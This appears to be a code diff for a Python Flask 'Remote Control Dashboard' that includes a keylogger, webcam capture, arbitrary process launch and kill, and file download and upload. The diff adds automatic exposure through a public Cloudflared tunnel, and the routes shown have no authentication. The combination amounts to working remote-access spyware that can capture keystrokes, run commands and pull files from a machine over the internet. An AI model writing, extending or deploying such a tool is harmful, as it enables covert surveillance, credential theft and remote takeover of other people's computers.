@@ -1,7 +1,6 @@
-# app.py
+# app.py  – Remote Control Dashboard v3 + Cloudflared
+# -------------------------------------------------------------------------
 """
-Remote Control Dashboard – v3
-============================
 Adds full feature set:
 - Keylogger (start/stop + fetch logs)
 - Webcam snapshot (JPEG)
@@ -12,21 +11,21 @@ Adds full feature set:
 - File browser (list, download, upload)
 - Power actions incl. sleep & hibernate
 - Brightness and volume get/set
+- 🔥 NEW: Auto-start Cloudflared tunnel & print public URL 🔥
 
 ***Run as Administrator*** for low-level control.
 
 Dependencies:
-```bash
-pip install flask psutil pillow pynput opencv-python sounddevice soundfile GPUtil wmi pycaw comtypes requests werkzeug
-```
+    pip install flask psutil pillow pynput opencv-python sounddevice soundfile \
+                GPUtil wmi pycaw comtypes requests werkzeug
+    # plus the cloudflared binary in PATH (or same folder)
 Then:
-```bash
-python app.py
-# → browse http://localhost:5000
-```
+    python app.py
 """
+
 from __future__ import annotations
-import io, ctypes, subprocess, re, threading, json, os, socket, platform, requests, shutil, uuid, tempfile
+import io, ctypes, subprocess, re, threading, json, os, socket, platform, requests
+import shutil, uuid, tempfile, time
 from datetime import datetime
 from pathlib import Path
 from typing import Dict, Any, List
@@ -67,7 +66,39 @@ UPLOAD_DIR = Path(tempfile.gettempdir()) / "remote_uploads"
 UPLOAD_DIR.mkdir(exist_ok=True)
 
 ###############################################################################
-# Helper functions
+# 🔗 Cloudflared helper
+###############################################################################
+
+def start_cloudflared(port: int = 5000) -> tuple[subprocess.Popen | None, str | None]:
+    """
+    Starts a Cloudflared tunnel to localhost:<port>.
+    Returns (process, public_url) – url is None on failure.
+    """
+    cld_bin = shutil.which("cloudflared") or shutil.which("cloudflared.exe")
+    if not cld_bin:
+        print("[!] cloudflared binary not found. Grab it from https://github.com/cloudflare/cloudflared/releases")
+        return None, None
+
+    cmd = [cld_bin, "tunnel", "--url", f"http://localhost:{port}"]
+    proc = subprocess.Popen(
+        cmd,
+        stdout=subprocess.PIPE,
+        stderr=subprocess.STDOUT,
+        text=True,
+        bufsize=1,
+    )
+
+    public_url = None
+    for line in proc.stdout:
+        # Look for the first generated URL
+        m = re.search(r"https://[-\w]+\.trycloudflare\.com", line)
+        if m:
+            public_url = m.group(0)
+            break
+    return proc, public_url
+
+###############################################################################
+# Helper functions (unchanged)
 ###############################################################################
 
 def ping_time(host: str = "8.8.8.8") -> int | None:
@@ -137,7 +168,7 @@ def specs() -> Dict[str, Any]:
     return out
 
 ###############################################################################
-# Keylogger
+# Keylogger (unchanged)
 ###############################################################################
 _keybuf: List[str] = []
 _key_running = False
@@ -148,7 +179,6 @@ def _on_press(k):
     with _lock:
         _keybuf.append(f"{datetime.now():%Y-%m-%d %H:%M:%S}\t{k}")
 
-
 def keylog_start():
     global _klistener, _key_running
     if keyboard is None or _key_running:
@@ -157,7 +187,6 @@ def keylog_start():
     _klistener.start()
     _key_running = True
 
-
 def keylog_stop():
     global _klistener, _key_running
     if _klistener:
@@ -165,7 +194,7 @@ def keylog_stop():
     _key_running = False
 
 ###############################################################################
-# Brightness / Volume
+# Brightness / Volume (unchanged)
 ###############################################################################
 
 def get_brightness() -> int | None:
@@ -181,7 +210,6 @@ def set_brightness(level: int):
         raise RuntimeError("WMI not available")
     wmi.WMI(namespace="wmi").WmiMonitorBrightnessMethods()[0].WmiSetBrightness(level, 0)
 
-
 def get_volume() -> int | None:
     if not AudioUtilities:
         return None
@@ -189,7 +217,6 @@ def get_volume() -> int | None:
     interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)  # type: ignore
     vol = cast(interface, POINTER(IAudioEndpointVolume))
     return int(vol.GetMasterVolumeLevelScalar() * 100)
-
 
 def set_volume(level: int):
     if not AudioUtilities:
@@ -200,7 +227,7 @@ def set_volume(level: int):
     vol.SetMasterVolumeLevelScalar(level / 100, None)
 
 ###############################################################################
-# Process Manager
+# Process Manager (unchanged)
 ###############################################################################
 
 def list_processes() -> List[Dict[str, Any]]:
@@ -213,7 +240,7 @@ def list_processes() -> List[Dict[str, Any]]:
     return procs
 
 ###############################################################################
-# File Browser helpers
+# File Browser helper
 ###############################################################################
 
 def safe_path(rel: str) -> Path:
@@ -221,7 +248,7 @@ def safe_path(rel: str) -> Path:
     return p
 
 ###############################################################################
-# Flask routes
+# Flask routes (unchanged)
 ###############################################################################
 
 @app.route("/")
@@ -322,10 +349,12 @@ def keylogs():
 
 # --------------------- Process Manager ------------------------
 @app.route("/processes")
+
 def processes():
     return jsonify(list_processes())
 
 @app.route("/process/<int:pid>/kill", methods=["POST"])
+
 def kill_proc(pid):
     try:
         p = psutil.Process(pid); p.terminate()
@@ -334,6 +363,7 @@ def kill_proc(pid):
         abort(404)
 
 @app.route("/process/start", methods=["POST"])
+
 def start_proc():
     data = request.json
     if not data or "cmd" not in data:
@@ -346,6 +376,7 @@ def start_proc():
 
 # --------------------- File Browser ---------------------------
 @app.route("/files")
+
 def listing():
     p = safe_path(request.args.get("path", ""))
     if not p.exists():
@@ -363,6 +394,7 @@ def listing():
     return jsonify(path=str(p), items=items)
 
 @app.route("/download")
+
 def download():
     p = safe_path(request.args.get("path", ""))
     if not p.is_file():
@@ -370,6 +402,7 @@ def download():
     return send_file(p, as_attachment=True)
 
 @app.route("/upload", methods=["POST"])
+
 def upload():
     if "file" not in request.files:
         abort(400)
@@ -379,9 +412,6 @@ def upload():
     f.save(dest)
     return jsonify(saved=str(dest))
 
-###############################################################################
-# Front-end (Bootstrap + Chart.js + Minimal JS for new endpoints)
-###############################################################################
 INDEX_HTML = r"""
 <!DOCTYPE html><html lang='en'><head>
 <meta charset='UTF-8'><title>Remote Dashboard</title>
@@ -428,12 +458,33 @@ async function kill(pid){await fetch('/process/'+pid+'/kill',{method:'POST'});lo
 async function tick(){const r=await fetch('/status');const s=await r.json();const t=new Date().toLocaleTimeString();if(cpuD.labels.length>30){cpuD.labels.shift();cpuD.datasets[0].data.shift();ramD.labels.shift();ramD.datasets[0].data.shift();}cpuD.labels.push(t);ramD.labels.push(t);cpuD.datasets[0].data.push(s.cpu);ramD.datasets[0].data.push(s.ram);cpuChart.update();ramChart.update();document.getElementById('stat').innerHTML=`<b>Internet:</b> ${s.internet} | ping ${s.ping||'n/a'} ms<br><b>Locked:</b> ${s.locked}<br><b>CPU / RAM:</b> ${s.cpu}% / ${s.ram}%<br><b>GPU Temp:</b> ${s.gpu_temp||'n/a'}°C<br><b>Battery:</b> ${s.battery? s.battery.percent+'% '+(s.battery.power_plugged?'⚡':'🔋'):'n/a'}<br><b>Disk C:</b> ${(s.disk['C:\\']?.free/1073741824).toFixed(1)} GB free`;
 const ipList=Object.entries(s.local_ips).map(([i,a])=>`${i}: ${a}`).join(' | ');
 const specs=`${s.specs.manufacturer||''} ${s.specs.model||''}<br>CPU: ${s.specs.cpu}<br>RAM: ${s.specs.ram_gb} GB<br>GPU: ${s.specs.gpu||'—'}<br>OS: ${s.specs.os}`;
-(document.getElementById('net').innerHTML=`<b>Local IPs:</b> ${ipList}<br><b>Public IP:</b> ${s.public_ip||'n/a'}<hr>${specs}`);
+document.getElementById('net').innerHTML=`<b>Local IPs:</b> ${ipList}<br><b>Public IP:</b> ${s.public_ip||'n/a'}<hr>${specs}`;
 }
 setInterval(tick,3000);setInterval(loadProcs,10000);tick();loadProcs();
 </script>
 </div></body></html>
 """
-###############################################################################
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
+
+if __name__ == "__main__":
+    # 1. Start Flask in a background thread
+    threading.Thread(
+        target=lambda: app.run(host="0.0.0.0", port=5000, use_reloader=False),
+        daemon=True,
+    ).start()
+
+    # 2. Fire up Cloudflared
+    proc, url = start_cloudflared(5000)
+
+    if url:
+        print(f"[+] Cloudflared tunnel active ➜  {url}")
+    else:
+        print("[-] Cloudflared: failed to obtain public URL.")
+
+    # 3. Keep main thread alive; Ctrl-C to quit
+    try:
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print("\n[!] Ctrl-C received, shutting down…")
+        if proc:
+            proc.terminate()
